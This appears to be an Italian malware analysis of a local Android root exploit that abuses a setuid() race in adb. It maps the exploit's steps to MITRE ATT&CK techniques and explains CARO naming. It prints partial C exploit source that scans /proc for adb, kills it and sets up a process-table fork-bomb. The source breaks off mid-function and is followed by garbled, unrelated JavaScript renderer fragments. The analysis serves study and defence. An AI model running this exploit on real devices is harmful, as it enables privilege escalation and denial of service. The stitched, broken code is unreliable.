;l'analisi di questo campione malware è stata condotta attraverso un processo di reverse engineering sul codice assembly, con l'obiettivo di ricostruire il comportamento reale del binario senza alcun accesso al codice sorgente originale. Il lavoro non si è basato su ipotesi astratte, ma sull'osservazione diretta delle istruzioni macchina, delle chiamate di sistema e delle interazioni con il sistema operativo.

;il comportamento emerge dalla lettura del flusso assembly: gestione dei processi, accesso al filesystem virtuale di Linux tramite /proc, utilizzo delle syscall e manipolazione delle risorse del sistema.

;il risultato è la ricostruzione di un malware che non si limita a sfruttare una singola vulnerabilità classica, ma agisce alterando progressivamente le condizioni operative del sistema fino a renderlo instabile e vulnerabile a una race condition durante la gestione di adb.

;Ditto è un Pokémon particolare, privo di una forma propria stabile. Non combatte attraverso una struttura rigida, ma attraverso la capacità di replicare ciò che osserva. La sua forza non deriva da una strategia aggressiva diretta, ma dall'adattamento e dalla copia del contesto circostante. È una entità che non impone una forma, ma la assume, la riflette e la moltiplica/altera.

TTP: Tactics, Techniques and ProceduresÈ il framework MITRE ATT&CK. Descrive il comportamento di un attaccante in modo strutturato e universale, indipendentemente dal codice specifico. Ogni TTP ha un ID numerico che permette a ricercatori e difensori di parlare lo stesso linguaggio. Si divide in tre livelli: la tattica è l'obiettivo generale (es. escalation di privilegi), la tecnica è il metodo usato (es. abuso di setuid), la procedura è l'implementazione specifica osservata nel campione. Serve principalmente a chi difende i sistemi per capire cosa cercare e come mitigare.

T1057: Process Discovery: la scansione iterativa di /proc/<pid>/cmdline per trovare adb
T1078.003: Valid Accounts: Local Accounts: sfrutta il contesto shell dell'utente adb
T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid: il cuore dell'exploit, la race condition su setuid()
T1562.001: Impair Defenses: disabilitazione implicita del servizio adb tramite SIGKILL
T1499.001: Endpoint Denial of Service: OS Exhaustion Flood: la fork-bomb che satura la process table
T1543: Create or Modify System Process: il riavvio di adb in stato alterato

CARO: Computer Antivirus Research Organization
È uno schema di nomenclatura standardizzato per i malware, nato negli anni '90 per evitare che vendor diversi chiamassero lo stesso malware in modi incompatibili. Il formato Tipo:Piattaforma/Famiglia.Variante permette di identificare univocamente un campione. Serve ai ricercatori per catalogare, confrontare e comunicare in modo non ambiguo quando si parla di un campione specifico, indipendentemente dal vendor che lo ha analizzato.

Il formato CARO è: Tipo:Piattaforma/Famiglia.Variante!Suffisso
Per questo campione:

Exploit:Android/AdbSetuid.A!generic

Exploit: tipo, perché non è un virus/worm ma un exploit locale
Android: piattaforma
AdbSetuid: famiglia, identifica il vettore
.A: prima variante nota
!generic: rilevamento generico senza analisi specifica

Tipo: categoria del malware: Virus, Worm, Trojan, Exploit, Backdoor, Ransomware, Spyware, Adware, Rootkit, Tool
Piattaforma: sistema operativo o ambiente: Android, Win32, Linux, MacOS, JS, Python ecc.
Famiglia: nome della famiglia malware: AdbSetuid, Exploid ecc.
Variante: lettera o numero che distingue versioni della stessa famiglia: .A, .B, .C ecc.
Suffisso: campo opzionale che aggiunge informazioni comportamentali, tra i più usati:

!rootkit: ha componenti rootkit
!packed: è compresso o offuscato
!dropped: è un payload droppato da un altro malware
!generic: rilevamento generico senza analisi specifica
!suspicious: comportamento sospetto ma non classificato

#include <stdio.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

pid_t find_adb()
{
	char buf[256];
	int i = 0, fd = 0;
	pid_t found = 0;

	for (i = 0; i < 32000; ++i) {
		sprintf(buf, "/proc/%d/cmdline", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (strstr(buf, "/sbin/adb")) {
			found = i;
			break;
		}
        }
        return found;
}


void restart_adb(pid_t pid)
{
	kill(pid, 9);
}


void wait_for_root_adb(pid_t old_adb)
{
	pid_t p = 0;

	for (;;) {
		p = find_adb();
		if (p != 0 && p != old_adb)
			break;
		sleep(1);
	}
	sleep(5);
	kill(-1, 9);
}

{

	adb_pid = find_adb();

		die("[-] Cannot find adb");

	printf("[*] Spawning children. Dont type anything and wait for reset!\n");
	printf("[*]\n[*] If you like what we are doing you can send us PayPal money to\n"

(function(){

    }

    // costruisce il contenuto dentro un unico div.article

    let inner = escCode(title);
    i; // già avanzato

    while(i < lines.length){
        const line = lines[i];

        // blocco @@@ → codice pre-wrap
        if(line.trim() === '@@@'){
            i++;
            let block = '';
            while(i < lines.length && lines[i].trim() !== '@@@'){
                block += lines[i] + '\n';

            }
            i++; // salta @@@ di chiusura

        // raccoglie testo fino al prossimo @@@

        const paragraphs = splitParagraphs(textLines);

	    inner += '<div class="commento">\n';

    output.innerHTML = '<div class="article">' + inner + '</div>';

    // escapa solo il testo codice (non i commenti che possono avere HTML)
    function escCode(str){
        return str
            .replace(/&(?!(?:amp|lt|gt|quot|#\d+);)/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    function splitParagraphs(lines){
        const result = [];
        let current = [];
        for(const line of lines){
            if(line.trim() === ''){
                if(current.length > 0){
                    result.push(current.join('\n'));
                    current = [];
                }
            } else {
                current.push(line);
            }
        }
        if(current.length > 0) result.push(current.join('\n'));
        return result;
    }
})();
</script>
